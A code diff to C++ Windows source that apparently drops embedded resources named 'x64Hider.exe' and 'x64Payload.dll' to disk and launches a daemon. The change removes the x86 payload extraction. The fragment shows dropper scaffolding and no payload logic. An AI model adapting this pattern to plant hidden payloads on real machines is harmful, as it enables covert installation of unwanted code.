@@ -8,10 +8,9 @@
 #define ID_BUFFER_SIZE 10
 #define x64LauncherFile L"x64Hider.exe"
 
-LPCWSTR x64filesList[] = {x64LauncherFile,  L"x64Payload.dll" },
-x86filesList[] = {  L"x86Payload.dll" };
-int x64resourceIDint[] = { IDR_RCDATA1, IDR_RCDATA4 }, x86resourceIDint[] = {  IDR_RCDATA5 };
-int x86ResNum=1,x64ResNum=2;
+LPCWSTR x64filesList[] = { x64LauncherFile };
+int x64resourceIDint[] = { IDR_RCDATA1 }; //dont care about x86, can't be called
+int x64ResNum = 1;
 
 
 BOOL IsElevated() {
@@ -39,7 +38,6 @@ BOOL isSystem64BitWow()
 } 
 int CreateProcessLine(TCHAR *command_line,bool newConsole)
 {
-//	PROCESS_INFORMATION ProcessInfo; //This is what we get as an [out] parameter
 	STARTUPINFO StartupInfo; //This is an [in] parameter
 	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
 	StartupInfo.cb = sizeof StartupInfo; //Only compulsory field
@@ -116,16 +114,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		CreateProcessLine(buffer,false);
 		return 0;
 	}
-	for (int i = 0; i < x86ResNum; i++)
-	{
-		TCHAR resource_int_buffer[ID_BUFFER_SIZE];
-		_itow_s(x86resourceIDint[i], resource_int_buffer, ID_BUFFER_SIZE, 10);
-		if (!CopyResourceIntoFile(x86filesList[i], MAKEINTRESOURCE(x86resourceIDint[i])))
-		{
-			printf("Failed building %ws, exiting!\n", x86filesList[i]);
-			return 1;
-		}
-	}
+
 	if(PrepareContents(argc, argv))
 	LaunchDaemon();
 	return 0;
